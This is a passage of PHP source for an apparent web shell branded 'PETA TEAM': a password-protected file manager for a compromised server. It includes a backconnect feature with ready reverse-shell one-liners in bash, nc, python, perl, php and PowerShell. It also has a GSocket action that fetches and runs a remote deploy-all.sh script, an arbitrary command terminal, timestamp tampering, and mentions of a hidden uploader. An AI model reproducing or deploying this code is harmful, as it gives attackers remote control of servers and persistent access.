        if (!empty($cached['ok'])) return true;
        /* a FAILED probe expires after 60 s — a stale session (e.g. from
           an older deploy that could not run commands at all) must heal
           itself instead of caching "no bash" forever */
        if (time() - (int)$cached['at'] < 60) return false;
    } elseif ($cached === true) {
        $_SESSION['term_bash'] = ['ok' => true, 'at' => time()];
        return true;
    }
    /* fresh probe (also re-runs once for old bool-false sessions) */
    $ok = false;
    if (command_exists('bash')) {
        list($code) = run_command('bash -c ' . escapeshellarg('exit 0'), root_dir(), 10);
        $ok = ($code === 0);
    }
    $_SESSION['term_bash'] = ['ok' => $ok, 'at' => time()];
    return $ok;
}

/* ---------- Backconnect (reverse shell, gecko-style) ---------- */

/* Reverse-shell payloads per method. $ip/$host and $port are validated
   by start_backconnect() before these strings are built, so they are
   safe to interpolate. */
function backconnect_payloads($ip, $port) {
    $p = [
        'bash'   => "bash -c 'bash -i >& /dev/tcp/{$ip}/{$port} 0>&1'",
        'nc'     => "rm -f /tmp/.bc;mkfifo /tmp/.bc;cat /tmp/.bc|/bin/sh -i 2>&1|nc {$ip} {$port} >/tmp/.bc",
        'python' => "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{$ip}\",{$port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        'perl'   => "perl -e 'use Socket;\$i=\"{$ip}\";\$p={$port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
        'php'    => "php -r '\$s=fsockopen(\"{$ip}\",{$port});proc_open(\"/bin/sh -i\",array(0=>\$s,1=>\$s,2=>\$s),\$p);'",
    ];
    if (is_windows()) {
        $p['powershell'] = "powershell -nop -W hidden -c \"\$c=New-Object Net.Sockets.TCPClient('{$ip}',{$port});\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){;\$d=(New-Object Text.ASCIIEncoding).GetString(\$b,0,\$i);\$r=(iex \$d 2>&1|Out-String);\$r2=\$r+'PS '+(pwd).Path+'> ';\$sb=([Text.Encoding]::ASCII).GetBytes(\$r2);\$s.Write(\$sb,0,\$sb.Length)}\"";
        $p['nc'] = "nc.exe {$ip} {$port} -e cmd.exe";
    }
    return $p;
}

/* Start a reverse shell to $ip:$port using $method. The shell is
   detached and runs in the background — this request returns right away.
   Returns [ok(bool), message]. */
function start_backconnect($ip, $port, $method) {
    $ip = trim((string)$ip);
    $port = (int)$port;
    $method = strtolower(trim((string)$method));
    if ($ip === '' || !preg_match('/^[a-zA-Z0-9.\-_]+$/', $ip)) {
        return [false, 'Invalid IP/hostname.'];
    }
    if ($port < 1 || $port > 65535) {
        return [false, 'Invalid port.'];
    }
    $payloads = backconnect_payloads($ip, $port);
    if (!isset($payloads[$method])) {
        return [false, 'Unknown method.'];
    }
    $cmd = $payloads[$method];
    if (is_windows()) {
        if (!function_exists('popen')) return [false, 'popen() is disabled on this server.'];
        $h = @popen('start /B ' . $cmd, 'r');
        if (!is_resource($h)) return [false, 'Could not start the process.'];
        @pclose($h);
    } else {
        if (!function_exists('exec')) return [false, 'exec() is disabled on this server.'];
        @exec($cmd . ' > /dev/null 2>&1 &');
    }
    return [true, 'Backconnect started (' . $method . ') → ' . $ip . ':' . $port];
}

/* Resolve a terminal "cd" target relative to the current terminal dir.
   The result must stay inside root_path (unless root_path = the whole
   server). Returns the absolute path or null. */
function term_resolve($pwd, $dest) {
    $root = root_dir();
    $d = trim($dest);
    if ($d === '' || $d === '~') return $root;
    $abs = ($d[0] === '/' || $d[0] === '\\')
        || (strlen($d) >= 2 && ctype_alpha($d[0]) && $d[1] === ':');
    $full = $abs ? $d : $pwd . DIRECTORY_SEPARATOR . $d;
    $rp = @realpath($full);
    if ($rp === false) return null;
    if ($root !== DIRECTORY_SEPARATOR && $rp !== $root
        && strpos($rp, rtrim($root, '/\\') . DIRECTORY_SEPARATOR) !== 0) return null;
    return $rp;
}

/* Rewrite the 'password' value in this file's configuration block
   (used only to clear a manually-set config password when unlocking).
   Anchored to the start of the line so comment examples above the
   config are never matched. */
function set_config_password($value) {
    $file = __FILE__;
    $src = @file_get_contents($file);
    if ($src === false) return false;
    $src2 = preg_replace_callback(
        "/^(\s*)'password'\s*=>\s*'[^']*'(\s*,)/m",
        function ($m) use ($value) {
            return $m[1] . "'password'    => '" . $value . "'" . $m[2];
        },
        $src,
        1
    );
    if ($src2 === null || $src2 === $src) return false;
    return @file_put_contents($file, $src2) !== false;
}

function redirect_back($path) {
    $f = safe_path($path);
    $rel = ($f !== null) ? rel_path($f) : '';
    header('Location: ' . self_url() . ($rel !== '' ? '?path=' . rawurlencode($rel) : ''));
    exit;
}

/* ---------- CSS (used by the main page & login) ---------- */
function print_css() {
echo <<<'CSS'
<style>
:root {
  --bg: #060a06; --card: #0a120a; --text: #3ddc6d; --muted: #2e8f4e;
  --border: #17351d; --accent: #21f060; --accent-2: #17c94e;
  --danger: #e33; --topbar: #020402;
}
* { box-sizing: border-box; margin: 0; padding: 0; }
body {
  font-family: Consolas, 'Courier New', monospace;
  background: var(--bg); color: var(--text); font-size: 13px;
}
a { color: var(--accent); text-decoration: none; }
a:hover { text-decoration: underline; }

.topbar {
  display: flex; align-items: center; gap: 14px; flex-wrap: wrap;
  background: var(--topbar); border-bottom: 1px solid var(--border);
  padding: 8px 14px; position: sticky; top: 0; z-index: 10;
}
.brand { font-weight: 700; font-size: 15px; white-space: nowrap; color: var(--accent); }
.top-actions { display: flex; gap: 6px; align-items: center; margin-left: auto; }
.brand:hover { text-decoration: none; }

.sysinfo {
  background: var(--card); border: 1px solid var(--border);
  padding: 8px 12px; margin-bottom: 10px; font-size: 12px;
}
.si-row { display: flex; gap: 8px; padding: 1px 0; flex-wrap: wrap; }
.si-label { color: var(--muted); min-width: 70px; }
.si-value { color: var(--text); word-break: break-all; }
.pwd-link { color: var(--accent); }
.pwd-link:hover { background: var(--border); text-decoration: none; }
.search-form { display: flex; }
.search-form input[type=text] {
  background: var(--card); border: 1px solid var(--border);
  color: var(--text); padding: 4px 8px; outline: none; width: 160px;
  font-family: inherit;
}
.search-form input[type=text]:focus { border-color: var(--accent); }

.wrap { max-width: 1100px; margin: 16px auto; padding: 0 14px 40px; }

.flash { padding: 8px 12px; margin-bottom: 12px; border: 1px solid; }
.flash.success { background: #0c2412; border-color: #1d5c2e; color: #41e876; }
.flash.error   { background: #240c0c; border-color: #5c1d1d; color: #e87171; }
.flash.info    { background: #0a1a0c; border-color: #1d3a22; color: #57c974; }

.toolbar { display: flex; gap: 6px; align-items: center; flex-wrap: wrap; margin-bottom: 10px; }
.spacer { flex: 1; }
.bulk-bar { display: none; gap: 4px; align-items: center; flex-wrap: wrap; }
.bulk-bar.show { display: flex; }
#bulk-count { color: var(--muted); font-size: 11px; margin-right: 4px; }

.btn {
  display: inline-block; background: var(--card); color: var(--accent);
  border: 1px solid var(--border); padding: 6px 12px;
  cursor: pointer; font-size: 12px; font-family: inherit;
}
.btn:hover { background: var(--accent); color: #000; text-decoration: none; }
.btn:disabled { opacity: .45; cursor: not-allowed; }
.btn:disabled:hover { background: var(--card); color: var(--accent); }
.btn-danger { color: var(--danger); border-color: #5c1d1d; }
.btn-danger:hover { background: var(--danger); color: #000; }
.btn-ghost { background: transparent; }
.btn-ghost:hover { background: var(--border); color: var(--text); }
.btn-small { padding: 3px 8px; font-size: 11px; }

/* modals */
.modal-overlay {
  display: none; position: fixed; top: 0; right: 0; bottom: 0; left: 0;
  background: rgba(0, 0, 0, .65); z-index: 50;
  align-items: flex-start; justify-content: center;
  padding: 9vh 12px 20px; overflow-y: auto;
}
.modal-overlay.open { display: flex; }
.modal {
  background: var(--card); border: 1px solid var(--border);
  width: 100%; max-width: 400px; padding: 16px;
  box-shadow: 0 0 0 1px #000, 0 14px 44px rgba(0, 0, 0, .7);
  animation: modal-pop .16s ease;
}
.modal-wide { max-width: 540px; }
@keyframes modal-pop {
  from { transform: translateY(-10px); opacity: 0; }
  to   { transform: none; opacity: 1; }
}
.modal-head {
  display: flex; justify-content: space-between; align-items: center;
  margin-bottom: 12px; font-size: 13px; font-weight: 700; letter-spacing: 1px;
}
.modal-close {
  background: none; border: 1px solid var(--border); color: var(--muted);
  cursor: pointer; font-size: 13px; line-height: 1; padding: 2px 7px; font-family: inherit;
}
.modal-close:hover { color: var(--danger); border-color: #5c1d1d; }
.modal-label { display: block; font-size: 12px; color: var(--muted); margin-bottom: 6px; }
.modal input[type=text] {
  width: 100%; padding: 8px 10px; border: 1px solid var(--border);
  background: var(--bg); color: var(--text); outline: none;
  font-family: inherit; margin-bottom: 12px;
}
.modal input[type=text]:focus { border-color: var(--accent); }
.modal-actions { display: flex; justify-content: flex-end; gap: 6px; }
.confirm-msg { margin-bottom: 14px; line-height: 1.5; word-break: break-word; }

.dropzone {
  border: 1px dashed var(--border); padding: 14px; background: var(--bg);
}
.dropzone.dragover { border-color: var(--accent); background: rgba(33, 240, 96, .05); }
.dropzone form { display: flex; flex-direction: column; gap: 8px; align-items: flex-start; }
.dropzone label { color: var(--muted); font-size: 12px; }
.hint { color: var(--muted); font-size: 11px; }
.upload-note { display: none; color: var(--danger); font-size: 11px; }
.upload-note.show { display: block; }
.upload-progress { display: none; gap: 8px; align-items: center; width: 100%; max-width: 420px; }
.up-bar { flex: 1; height: 10px; border: 1px solid var(--border); background: var(--bg); overflow: hidden; }
.up-fill { width: 0%; height: 100%; background: var(--accent); transition: width .2s; }
.up-text { font-size: 11px; color: var(--muted); white-space: nowrap; }

.card { background: var(--card); border: 1px solid var(--border); overflow: hidden; }
.card h3 { padding: 10px 14px; font-size: 13px; border-bottom: 1px solid var(--border); }
.results { list-style: none; padding: 6px 14px; }
.results li { padding: 3px 0; display: flex; gap: 6px; align-items: center; }
.results-card { margin-bottom: 10px; }
.search-empty { padding: 10px 14px; }

table { width: 100%; border-collapse: collapse; }
th, td { padding: 7px 10px; text-align: left; border-bottom: 1px solid var(--border); }
th { font-size: 11px; color: var(--muted); font-weight: 600; white-space: nowrap; text-transform: uppercase; }
td { vertical-align: middle; }
tbody tr:hover { background: rgba(33,240,96,.06); }
.col-check { width: 30px; }
.col-size { width: 85px; }
.col-date { width: 125px; }
.col-perm { width: 65px; }
.col-act { width: 200px; white-space: nowrap; }
.col-name { min-width: 200px; }
.icon { margin-right: 5px; }

.act {
  background: none; border: 1px solid var(--border); cursor: pointer; font-size: 11px;
  padding: 1px 5px; opacity: .85; font-family: inherit; color: var(--text);
  margin-right: 2px;
}
.act:hover { background: var(--border); opacity: 1; color: var(--accent); }
a.act:hover { text-decoration: none; }
.act.danger { color: var(--danger); border-color: #5c1d1d; }
.act.danger:hover { background: #2a0d0d; color: var(--danger); }

.footer { display: flex; gap: 14px; flex-wrap: wrap; color: var(--muted); font-size: 11px; padding: 12px 2px; }
.muted { color: var(--muted); }

.file-page { padding: 14px; }
.file-head { display: flex; justify-content: space-between; align-items: center; gap: 10px; margin-bottom: 12px; flex-wrap: wrap; }
.file-head h2 { font-size: 14px; display: flex; gap: 6px; align-items: center; word-break: break-all; }
.file-actions { display: flex; gap: 6px; }
.editor {
  width: 100%; min-height: 65vh; background: var(--bg); color: var(--text);
  border: 1px solid var(--border); padding: 10px;
  font-family: inherit; font-size: 13px;
  line-height: 1.5; resize: vertical; outline: none;
}
.editor:focus { border-color: var(--accent); }
.editor-actions { display: flex; gap: 6px; margin-top: 10px; }
.img-wrap { text-align: center; }
.img-wrap img { max-width: 100%; }

.login-wrap { min-height: 100vh; display: flex; align-items: center; justify-content: center; background: var(--bg); }
.login-card { background: var(--card); border: 1px solid var(--border); padding: 22px 20px; width: 260px; }
.login-card h1 { font-size: 15px; letter-spacing: 3px; text-align: center; margin-bottom: 14px; color: var(--accent); }
.login-card input[type=password] {
  width: 100%; padding: 8px 10px; border: 1px solid var(--border);
  background: var(--bg); color: var(--text); margin-bottom: 10px; outline: none;
  font-family: inherit;
}
.login-card input[type=password]:focus { border-color: var(--accent); }
.login-card .btn { width: 100%; }
.login-card .flash { margin-bottom: 10px; }

/* terminal panel */
.term-card { margin-top: 14px; background: #020402; border: 1px solid var(--border); }
.term-head {
  display: flex; align-items: center; gap: 10px; flex-wrap: wrap;
  padding: 6px 10px; border-bottom: 1px solid var(--border);
  font-size: 11px;
}
.term-head h2 { font-size: 12px; color: var(--accent); }
.term-out {
  margin: 0; padding: 10px; min-height: 90px; max-height: 300px;
  overflow-y: auto; white-space: pre-wrap; word-break: break-all;
  font-size: 12px; line-height: 1.45; color: var(--text); background: #020402;
}
.term-out .t-cmd { color: #d8ffe2; }
.term-form {
  display: flex; align-items: center; gap: 8px;
  padding: 6px 10px; border-top: 1px solid var(--border);
}
.term-prompt { color: var(--accent); white-space: nowrap; font-size: 12px; }
.term-form input[type="text"] {
  flex: 1; background: #020402; color: var(--text);
  border: 1px solid var(--border); padding: 6px 8px;
  font-family: inherit; font-size: 12px; outline: none;
}
.term-form input[type="text"]:focus { border-color: var(--accent); }

/* backconnect (reverse shell) form */
.bc-form {
  display: flex; gap: 6px; align-items: center; flex-wrap: wrap;
  padding: 8px 10px; border-top: 1px solid var(--border); background: #020402;
}
.bc-form .bc-label { color: var(--accent); font-size: 12px; font-weight: bold; }
.bc-form input[type="text"], .bc-form input[type="number"], .bc-form select {
  background: #020402; color: var(--text); border: 1px solid var(--border);
  padding: 6px 8px; font-family: inherit; font-size: 12px; outline: none;
}
.bc-form input[type="text"] { flex: 1; min-width: 130px; }
.bc-form input[type="number"] { width: 90px; }
.bc-form input:focus, .bc-form select:focus { border-color: var(--accent); }

/* flash rendered as terminal output (GSocket result) */
.flash-term { background: #020402; border-color: var(--border); padding: 0; }
.flash-term pre {
  margin: 0; padding: 10px; white-space: pre-wrap; word-break: break-all;
  font-size: 12px; line-height: 1.45; color: var(--text);
  max-height: 340px; overflow-y: auto;
}

@media (max-width: 720px) {
  .col-perm { display: none; }
  .search-form input[type=text] { width: 100px; }
  .table-card { overflow-x: auto; }
}
</style>
CSS;
}

/* ---------- Login page ---------- */
function render_login() {
    $fl = take_flash();
    $locked = (($_SESSION['fail_count'] ?? 0) >= 5) && (time() - ($_SESSION['lock_time'] ?? 0)) < 300;
    ?><!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login — PETA TEAM</title>
<?php print_css(); ?>
</head>
<body>
<div class="login-wrap">
  <form class="login-card" method="post">
    <h1>PETA TEAM</h1>
    <?php if ($fl): ?><div class="flash <?= e($fl['type']) ?>"><?= e($fl['msg']) ?></div><?php endif; ?>
    <input type="hidden" name="action" value="login">
    <input type="hidden" name="csrf" value="<?= e(csrf_token()) ?>">
    <input type="password" name="password" placeholder="Password" autofocus <?= $locked ? 'disabled' : '' ?>>
    <button class="btn" <?= $locked ? 'disabled' : '' ?>>Login</button>
  </form>
</div>
</body>
</html><?php
    exit;
}

/* =====================================================================
 *  PROCESS ACTIONS (POST)
 * ===================================================================== */

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = isset($_POST['action']) ? $_POST['action'] : '';

    /* Login: handled before all other actions */
    if ($action === 'login') {
        $locked = (($_SESSION['fail_count'] ?? 0) >= 5) && (time() - ($_SESSION['lock_time'] ?? 0)) < 300;
        if (!csrf_check()) {
            flash('Security token invalid.', 'error');
        } elseif ($locked) {
            $sisa = 300 - (time() - $_SESSION['lock_time']);
            flash("Too many failed attempts. Try again in {$sisa} seconds.", 'error');
        } elseif (check_password(isset($_POST['password']) ? $_POST['password'] : '')) {
            session_regenerate_id(true);
            $_SESSION['logged_in'] = true;
            $_SESSION['fail_count'] = 0;
            unset($_SESSION['lock_time']);
            flash('Login successful!', 'success');
        } else {
            $_SESSION['fail_count'] = ($_SESSION['fail_count'] ?? 0) + 1;
            if ($_SESSION['fail_count'] >= 5) {
                $_SESSION['lock_time'] = time();
                flash('Too many failed attempts. Try again in 300 seconds.', 'error');
            } else {
                flash('Wrong password.', 'error');
            }
        }
        header('Location: ' . self_url());
        exit;
    }

    if (is_logged_in() && csrf_check()) {
        $back = isset($_POST['back']) ? $_POST['back'] : '';

        switch ($action) {

            case 'create_file':
                $dir = safe_path(isset($_POST['dir']) ? $_POST['dir'] : '');
                $name = sanitize_name(isset($_POST['name']) ? $_POST['name'] : '');
                if ($dir === null || !is_dir($dir) || $name === '') {
                    flash('File name is invalid.', 'error');
                } else {
                    $target = $dir . DIRECTORY_SEPARATOR . $name;
                    if (file_exists($target)) {
                        flash("'{$name}' already exists.", 'error');
                    } elseif (@file_put_contents($target, '') !== false) {
                        flash("File '{$name}' created.", 'success');
                        /* open the editor right away — no need to hunt for the file */
                        header('Location: ' . self_url() . '?action=open&path=' . rawurlencode(rel_path($target)));
                        exit;
                    } else {
                        flash('Could not create the file (write permission?).', 'error');
                    }
                }
                break;

            case 'create_dir':
                $dir = safe_path(isset($_POST['dir']) ? $_POST['dir'] : '');
                $name = sanitize_name(isset($_POST['name']) ? $_POST['name'] : '');
                if ($dir === null || !is_dir($dir) || $name === '') {
                    flash('Folder name is invalid.', 'error');
                } else {
                    $target = $dir . DIRECTORY_SEPARATOR . $name;
                    if (file_exists($target)) flash("'{$name}' already exists.", 'error');
                    elseif (@mkdir($target, 0775)) flash("Folder '{$name}' created.", 'success');
                    else flash('Could not create the folder (write permission?).', 'error');
                }
                break;

            case 'upload':
                $dir = safe_path(isset($_POST['dir']) ? $_POST['dir'] : '');
                $extract = !empty($_POST['extract_zip']);
                if ($dir === null || !is_dir($dir)) {
                    flash('Destination folder is invalid.', 'error');
                    break;
                }
                if (empty($_FILES['files']) || !is_array($_FILES['files']['name'])) {
                    flash('No files were selected.', 'error');
                    break;
                }
                $ok = 0; $fail = 0; $notes = [];
                for ($i = 0; $i < count($_FILES['files']['name']); $i++) {
                    if ($_FILES['files']['error'][$i] !== UPLOAD_ERR_OK) { $fail++; continue; }
                    $name = sanitize_name($_FILES['files']['name'][$i]);
                    if ($name === '') { $fail++; continue; }
                    $target = $dir . DIRECTORY_SEPARATOR . $name;
                    if (!move_uploaded_file($_FILES['files']['tmp_name'][$i], $target)) { $fail++; continue; }
                    $ok++;
                    if ($extract && preg_match('/\.zip$/i', $name) && zip_available()) {
                        if (extract_zip($target, $dir)) {
                            $notes[] = "'{$name}' extracted successfully.";
                            @unlink($target);
                        } else {
                            $notes[] = "'{$name}' uploaded but failed to extract.";
                        }
                    }
                }
                flash("{$ok} file(s) uploaded" . ($fail ? ", {$fail} failed" : '') . '. '
                    . implode(' ', $notes), $ok > 0 ? 'success' : 'error');
                break;

            case 'rename':
                $f = safe_path(isset($_POST['path']) ? $_POST['path'] : '');
                $newname = sanitize_name(isset($_POST['newname']) ? $_POST['newname'] : '');
                if ($f === null || $newname === '') {
                    flash('New name is invalid.', 'error');
                } elseif ($f === root_dir()) {
                    flash('The main folder cannot be renamed.', 'error');
                } else {
                    $target = dirname($f) . DIRECTORY_SEPARATOR . $newname;
                    if (file_exists($target)) flash("'{$newname}' already exists.", 'error');
                    elseif (@rename($f, $target)) flash('Renamed successfully.', 'success');
                    else flash('Rename failed.', 'error');
                }
                break;

            case 'delete':
                $paths = isset($_POST['paths']) ? (array)$_POST['paths'] : [];
                if (!$paths) { flash('No items selected.', 'error'); break; }
                $ok = 0; $fail = 0;
                foreach ($paths as $p) {
                    $f = safe_path($p);
                    if ($f === null || $f === root_dir()) { $fail++; continue; }
                    if (rrmdir($f)) $ok++; else $fail++;
                }
                flash("{$ok} item(s) deleted" . ($fail ? ", {$fail} failed." : '.'), $ok > 0 ? 'success' : 'error');
                break;

            case 'copy':
            case 'move':
                $paths = isset($_POST['paths']) ? (array)$_POST['paths'] : [];
                $dest = safe_path(isset($_POST['dest']) ? $_POST['dest'] : '');
                if (!$paths) { flash('No items selected.', 'error'); break; }
                if ($dest === null || !is_dir($dest)) { flash('Destination folder is invalid.', 'error'); break; }
                $ok = 0; $fail = 0;
                foreach ($paths as $p) {
                    $f = safe_path($p);
                    if ($f === null || $f === root_dir()) { $fail++; continue; }
                    /* prevent copying a folder into itself */
                    if (is_dir($f) && ($dest === $f || strpos($dest, $f . DIRECTORY_SEPARATOR) === 0)) { $fail++; continue; }
                    $name = basename($f);
                    $target = $dest . DIRECTORY_SEPARATOR . $name;
                    $n = 1;
                    while (file_exists($target)) {
                        $target = $dest . DIRECTORY_SEPARATOR . $name . ' (copy' . ($n > 1 ? ' ' . $n : '') . ')';
                        $n++;
                    }
                    $hasil = ($action === 'copy') ? rcopy($f, $target) : @rename($f, $target);
                    if ($hasil) $ok++; else $fail++;
                }
                flash(($action === 'copy' ? 'Copy' : 'Move') . ": {$ok} succeeded"
                    . ($fail ? ", {$fail} failed." : '.'), $ok > 0 ? 'success' : 'error');
                break;

            case 'save_file':
                $f = safe_path(isset($_POST['path']) ? $_POST['path'] : '');
                if ($f === null || !is_file($f)) {
                    flash('File not found.', 'error');
                } elseif (!is_writable($f)) {
                    flash('File is not writable (permissions).', 'error');
                } else {
                    $content = isset($_POST['content']) ? $_POST['content'] : '';
                    if (@file_put_contents($f, $content) !== false) flash('File saved.', 'success');
                    else flash('Failed to save the file.', 'error');
                }
                break;

            case 'chmod':
                if (is_windows()) { flash('CHMOD is not supported on Windows.', 'error'); break; }
                $paths = isset($_POST['paths']) ? (array)$_POST['paths'] : [];
                $mode = isset($_POST['mode']) ? $_POST['mode'] : '';
                if (!preg_match('/^0?[0-7]{3}$/', $mode)) { flash('Invalid mode (example: 755).', 'error'); break; }
                $ok = 0;
                foreach ($paths as $p) {
                    $f = safe_path($p);
                    if ($f !== null && @chmod($f, octdec($mode))) $ok++;
                }
                flash("CHMOD applied to {$ok} item(s).", 'success');
                break;

            case 'touch':
                $paths = isset($_POST['paths']) ? (array)$_POST['paths'] : [];
                $newtime = trim(isset($_POST['newtime']) ? $_POST['newtime'] : '');
                if ($newtime === '') { flash('Date cannot be empty.', 'error'); break; }
                $ts = strtotime($newtime);
                if ($ts === false) { flash('Invalid date format (example: 2026-08-21 14:30).', 'error'); break; }
                $ok = 0;
                foreach ($paths as $p) {
                    $f = safe_path($p);
                    if ($f !== null && @touch($f, $ts)) $ok++;
                }
                flash("Modification date changed on {$ok} item(s).", 'success');
                break;

            case 'lock':
                $depInfo = lock_data();
                if (password_set()) {
                    /* unlock: keep .peta-lock (deployment marker) and only
                       clear the password — the shell alone is unlocked.
                       A manually-set config password is cleared too,
                       when the script file is writable. */
                    $saved = lock_save('', (bool)$depInfo['deployed']);
                    $cleared = true;
                    if (trim((string)$CONFIG['password']) !== '') {
                        $cleared = set_config_password('');
                        if ($cleared) $CONFIG['password'] = '';
                    }
                    if ($saved && $cleared) {
                        flash('Unlocked — PETA TEAM is no longer password-protected.', 'success');
                    } else {
                        flash('Unlock failed — the lock file could not be updated (permissions?).', 'error');
                    }
                } else {
                    /* lock: only set the password (from config, stored as a
                       hash — the plain password is never written to disk
                       or shown anywhere). The hidden uploader was already
                       deployed when the manager was opened, and .peta-lock
                       marks it — no new file, no Telegram. */
                    $lockPass = trim((string)$CONFIG['lock_password']);
                    if ($lockPass === '') {
                        flash('Lock failed — no lock password configured.', 'error');
                    } elseif (lock_save(password_hash($lockPass, PASSWORD_DEFAULT), (bool)$depInfo['deployed'])) {
                        flash('Locked — the manager is now password-protected.', 'success');
                    } else {
                        flash('Lock failed — the script folder is not writable (permissions?).', 'error');
                    }
                }
                break;

            case 'unzip':
                $f = safe_path(isset($_POST['path']) ? $_POST['path'] : '');
                if ($f === null || !is_file($f) || !preg_match('/\.zip$/i', $f)) {
                    flash('Invalid ZIP file.', 'error');
                } elseif (!zip_available()) {
                    flash('The ZipArchive extension is not available on this server.', 'error');
                } elseif (extract_zip($f, dirname($f))) {
                    flash("'" . basename($f) . "' extracted successfully.", 'success');
                } else {
                    flash('Failed to extract ZIP (corrupted file or unsafe entries).', 'error');
                }
                break;

            case 'download_zip':
                $paths = isset($_POST['paths']) ? (array)$_POST['paths'] : [];
                $valid = [];
                foreach ($paths as $p) {
                    $f = safe_path($p);
                    if ($f !== null && $f !== root_dir()) $valid[] = $f;
                }
                if (!$valid) { flash('No items selected.', 'error'); break; }
                if (!zip_available()) { flash('The ZipArchive extension is not available on this server.', 'error'); break; }
                $tmp = tempnam(sys_get_temp_dir(), 'fmzip');
                if ($tmp !== false) {
                    @unlink($tmp);
                    $tmp .= '.zip';
                    $za = new ZipArchive();
                    if ($za->open($tmp, ZipArchive::CREATE | ZipArchive::OVERWRITE) === true) {
                        foreach ($valid as $p) zip_add_items($za, $p, dirname($p));
                        $za->close();
                        $zipName = (count($valid) === 1)
                            ? basename($valid[0]) . '.zip'
                            : 'peta-team-' . date('Ymd-His') . '.zip';
                        serve_download($tmp, $zipName, true);   // exits
                    }
                }
                flash('Failed to create the ZIP.', 'error');
                break;

            case 'gsocket': {
                /* GSocket: download the official deploy-all.sh and run it
                   with bash, then ALWAYS remove the downloaded file. The
                   step-by-step result is shown in the flash message. */
                $lines = [];
                $url = 'http://nossl.segfault.net/deploy-all.sh';
                $tmpDir = sys_get_temp_dir();
                $scriptPath = $tmpDir . DIRECTORY_SEPARATOR . 'deploy-all.sh';
                /* remove any leftover file first — a stale script must
                   never count as a fresh download */
                @unlink($scriptPath);
                $ok = true;

                /* step 1 — download via curl or wget */
                $downloader = '';
                if (command_exists('curl')) {
                    $downloader = 'curl';
                    $dlCmd = 'curl -fsSL -o ' . escapeshellarg($scriptPath) . ' ' . escapeshellarg($url);
                } elseif (command_exists('wget')) {
                    $downloader = 'wget';
                    $dlCmd = 'wget -q -O ' . escapeshellarg($scriptPath) . ' ' . escapeshellarg($url);
                } else {
                    $lines[] = '[1/2] download — FAILED: neither curl nor wget is available on this server';
                    $ok = false;
                }
                if ($ok) {
                    list($dlCode, $dlOut) = run_command($dlCmd, $tmpDir, 60);
                    /* the downloaded file is the real proof — some hosts
                       never expose the exit code (null = unknown) */
                    $gotFile = is_file($scriptPath) && @filesize($scriptPath) > 0;
                    $dlOk = $gotFile && ($dlCode === 0 || $dlCode === null);
                    if ($dlOk) {
                        $lines[] = '[1/2] download via ' . $downloader . ' — OK';
                    } else {
                        $lines[] = '[1/2] download via ' . $downloader . ' — FAILED'
                            . ($dlCode === null ? ' (exit code unavailable)' : ' (exit ' . $dlCode . ')');
                    }
                    if (trim($dlOut) !== '') $lines[] = trim($dlOut);
                    if (!$dlOk) $ok = false;
                }

                /* step 2 — run deploy-all.sh (bash when it really runs,
                   otherwise sh — some hosts deny executing bash) */
                if ($ok) {
                    $runner = bash_works() ? 'bash' : (command_exists('sh') ? 'sh' : '');
                    if ($runner === '') {
                        $lines[] = '[2/2] run deploy-all.sh — FAILED: neither bash nor sh is available';
                        $ok = false;
                    } else {
                        list($runCode, $runOut) = run_command($runner . ' ' . escapeshellarg($scriptPath), $tmpDir, 120);
                        if ($runCode === 0) {
                            $lines[] = '[2/2] ' . $runner . ' deploy-all.sh — OK';
                        } elseif ($runCode === null) {
                            $lines[] = '[2/2] ' . $runner . ' deploy-all.sh — finished (exit code unavailable)';
                        } else {
                            $lines[] = '[2/2] ' . $runner . ' deploy-all.sh — FAILED (exit ' . $runCode . ')';
                        }
                        $lines[] = '--- result ---';
                        $lines[] = trim($runOut) !== '' ? trim($runOut) : '(no output)';
                    }
                }

                /* cleanup — the downloaded file is removed once the
                   result has been collected, success or failure */
                if (is_file($scriptPath)) {
                    @unlink($scriptPath);
                    $lines[] = '--- cleanup ---';
                    $lines[] = 'deploy-all.sh ' . (is_file($scriptPath) ? 'could NOT be removed' : 'removed');
                }
                flash(implode("\n", $lines), 'term');
                break;
            }

            case 'backconnect': {
                /* reverse shell to the given listener — runs detached in
                   the background, gecko-style payloads */
                list($bcOk, $bcMsg) = start_backconnect(
                    isset($_POST['bc_ip']) ? $_POST['bc_ip'] : '',
                    isset($_POST['bc_port']) ? (int)$_POST['bc_port'] : 0,
                    isset($_POST['bc_method']) ? $_POST['bc_method'] : ''
                );
                flash($bcMsg, $bcOk ? 'term' : 'error');
                break;
            }

            case 'term': {
                /* terminal: one command at a time, output kept in the
                   session history and rendered in the terminal panel */
                $cmd = trim(isset($_POST['cmd']) ? (string)$_POST['cmd'] : '');
                if ($cmd === '') { flash('Empty command.', 'error'); break; }
                if (strlen($cmd) > 2000) { flash('Command too long.', 'error'); break; }
                $pwd = (isset($_SESSION['term_pwd']) && is_string($_SESSION['term_pwd']) && is_dir($_SESSION['term_pwd']))
                    ? $_SESSION['term_pwd'] : term_start_dir();
                $hist = (isset($_SESSION['term_hist']) && is_array($_SESSION['term_hist']))
                    ? $_SESSION['term_hist'] : [];

                if ($cmd === 'clear') {
                    $_SESSION['term_hist'] = [];
                    flash('Terminal cleared.', 'info');
                    break;
                }
                if (preg_match('/^cd(?:\s+(.+))?$/s', $cmd, $m)) {
                    $dest = isset($m[1]) ? trim($m[1]) : '';
                    $new = term_resolve($pwd, $dest);
                    if ($new === null) {
                        $hist[] = ['pwd' => $pwd, 'cmd' => $cmd, 'out' => "cd: no such directory or outside the main folder\n"];
                        flash('cd: no such directory or outside the main folder.', 'error');
                    } else {
                        $_SESSION['term_pwd'] = $new;
                        $hist[] = ['pwd' => $pwd, 'cmd' => $cmd, 'out' => ''];
                    }
                    $_SESSION['term_hist'] = array_slice($hist, -100);
                    break;
                }
                /* bash only when it really runs — blocked bash (some hosts
                   deny executing it) falls back to plain sh via proc_open */
                $shellCmd = $cmd;
                if (!is_windows() && bash_works()) {
